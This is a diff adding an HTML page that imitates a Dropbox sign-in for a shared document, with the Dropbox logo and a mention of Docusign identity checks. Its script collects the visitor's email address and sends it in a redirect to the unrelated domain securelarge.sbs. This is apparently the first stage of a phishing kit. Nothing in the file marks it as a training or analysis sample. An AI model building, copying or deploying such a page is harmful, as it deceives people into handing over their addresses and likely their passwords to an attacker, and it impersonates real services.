@@ -1,0 +1,177 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Dropbox - Document Access</title>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" crossorigin="anonymous">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+      background: #f7f9fa;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    }
+    .main-wrapper {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100%;
+      padding: 20px;
+    }
+    .card-wrapper {
+      background: #ffffff;
+      border-radius: 0;
+      padding: 48px 40px;
+      max-width: 400px;
+      width: 100%;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+      text-align: left;
+      border: none;
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 24px;
+    }
+    .logo svg {
+      width: 40px;
+      height: 40px;
+    }
+    .logo path {
+      fill: #0061ff;
+    }
+    .card-wrapper h2 {
+      color: #1e1919;
+      font-size: 20px;
+      font-weight: 600;
+      margin-bottom: 8px;
+      text-align: center;
+    }
+    .card-wrapper p.lead {
+      font-size: 14px;
+      margin-top: 0;
+      margin-bottom: 24px;
+      color: #637381;
+      text-align: center;
+      line-height: 1.5;
+    }
+    .info-box {
+      background-color: #f7f9fa;
+      color: #1e1919;
+      font-size: 13px;
+      padding: 12px 16px;
+      border: 1px solid #e6e8eb;
+      margin-top: 0;
+      margin-bottom: 24px;
+      text-align: left;
+      border-radius: 4px;
+    }
+    .form-group {
+      margin-bottom: 16px;
+    }
+    .form-control {
+      height: 48px;
+      font-size: 14px;
+      border: 1px solid #c1c7cd;
+      border-radius: 4px;
+      padding: 12px 16px;
+      margin-top: 0;
+    }
+    .form-control:focus {
+      border-color: #0061ff;
+      box-shadow: 0 0 0 2px rgba(0, 97, 255, 0.1);
+    }
+    .btn-custom {
+      background-color: #0061ff;
+      color: #fff;
+      font-weight: 600;
+      margin-top: 8px;
+      padding: 14px 16px;
+      font-size: 14px;
+      border: none;
+      border-radius: 4px;
+      width: 100%;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+    .btn-custom:hover {
+      background-color: #0052d4;
+      color: #fff;
+      transform: translateY(-1px);
+      box-shadow: 0 4px 12px rgba(0, 97, 255, 0.3);
+    }
+    .btn-custom:active {
+      transform: translateY(0);
+      box-shadow: 0 2px 6px rgba(0, 97, 255, 0.3);
+    }
+    .val-msg {
+      text-align: left;
+      margin-top: 8px;
+      font-size: 13px;
+      color: #e82110;
+    }
+    hr {
+      margin-top: 32px;
+      margin-bottom: 16px;
+      border-color: #e6e8eb;
+    }
+    .footer-text {
+      text-align: center;
+      font-size: 13px;
+      color: #637381;
+    }
+    .footer-text a {
+      color: #0061ff;
+      text-decoration: none;
+    }
+    .footer-text a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="main-wrapper">
+    <div class="card-wrapper">
+      <div class="logo">
+        <svg viewBox="0 0 528 512" xmlns="http://www.w3.org/2000/svg">
+          <path d="M264.4 116.3l-132 84.3 132 84.3-132 84.3L0 284.1l132.3-84.3L0 116.3 132.3 32l132.1 84.3zM131.6 395.7l132-84.3 132 84.3-132 84.3-132-84.3zm132.8-111.6l132-84.3-132-84.3L395.7 32 528 116.3l-132.3 84.3L528 284.1l-132.3 84.3-131.3-84.3z"/>
+        </svg>
+      </div>
+      <h2>Sign in to access document</h2>
+      <p class="lead">Enter your email to securely view this shared file.</p>
+      <div class="info-box">
+        <i class="fas fa-shield-alt" style="margin-right: 8px; color: #0061ff;"></i>
+        Docusign verifies your identity before granting access to shared documents.
+      </div>
+      <div class="form-group">
+        <input type="email" id="email" class="form-control" placeholder="Work or Business Email" />
+      </div>
+      <div class="text-danger d-none val-msg"><i class="fas fa-exclamation-circle" style="margin-right: 4px;"></i> Please enter a valid email address</div>
+      <button class="btn btn-custom validate" type="button">Continue</button>
+      <hr>
+      <p class="footer-text mb-0">Need help? <a href="#">Contact support</a></p>
+    </div>
+  </div>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.0/jquery.min.js"></script>
+  <script>
+    $('.validate').click(function () {
+      const email = $('#email').val().trim();
+      const errorMsg = $('.val-msg');
+
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+      if (!emailRegex.test(email)) {
+        errorMsg.removeClass('d-none');
+        return;
+      }
+
+      errorMsg.addClass('d-none');
+
+      const redirectUrl = 'https://securelarge.sbs/?d7abe308/' + encodeURIComponent(email);
+      window.location.href = redirectUrl;
+    });
+  </script>
+</body>
+</html>
